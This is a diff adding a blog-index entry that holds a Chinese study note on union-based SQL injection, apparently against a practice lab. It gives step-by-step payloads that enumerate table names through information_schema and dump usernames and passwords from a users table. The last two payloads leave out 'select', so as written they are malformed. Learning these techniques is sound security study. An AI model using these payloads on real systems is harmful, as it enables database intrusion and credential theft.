@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>union注入</title>
+      <link href="/2024/12/20/union%E6%B3%A8%E5%85%A5/"/>
+      <url>/2024/12/20/union%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>一、拿到表名和列名<br>    1.<br>                                                                    数据表<br>           数据库              其中包含有两个所需数据表         tables    (表名集合表)<br>        imformation_schema    ————————&gt;       columns   (列名集合表)<br>    包含所有mysql数据库的简要信息</p><p>二、查找数据库security中的表名<br>    第一步 确定基本查询语句<br>        1.字符型(闭合符号)&#x2F;数字型<br>        2.查询语句group by<br>        &gt;id&#x3D;1’union select 1,2,3 –+<br><img src="/images/union1.png" alt="1"><br>    第二步 完善查询语句<br>        1.输入不存在的数据<br>        &gt;id&#x3D;0’union select 1,2,3 –+<br><img src="/images/union2.png" alt="2"><br>        2.所需表名信息在数据库Information_schema-&gt;数据表tables-&gt;数据列table_name<br>        &gt;id&#x3D;0’union select 1,table_name,3 from information_schema.tables–+<br><img src="/images/union3.png" alt="3"><br>        3.过滤在security数据库中的表名，即table_schema为security的行<br>        &gt;id&#x3D;0’union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;’security’ –+<br><img src="/images/union4.png" alt="4"><br>        (group_concat的作用：确保所有查询信息能放到一行显示出来)<br>        &gt;id&#x3D;0’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ –+<br><img src="/images/union5.png" alt="5"><br>三、查询最终目标<br>    查询语句  select列名+from表名+where限定语句<br>    &gt;id&#x3D;0’ union group_concat(username,password),3 from users –+<br><img src="/images/union6.png" alt="6"><br>    可插入“，”区分数据<br>     &gt;id&#x3D;0’ union group_concat(username,’，’,password),3 from users –+<br><img src="/images/union7.png" alt="7">    </p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>mysql增删改（二）</title>
       <link href="/2024/12/08/mysql%E5%A2%9E%E5%88%A0%E6%94%B9%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
       <url>/2024/12/08/mysql%E5%A2%9E%E5%88%A0%E6%94%B9%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
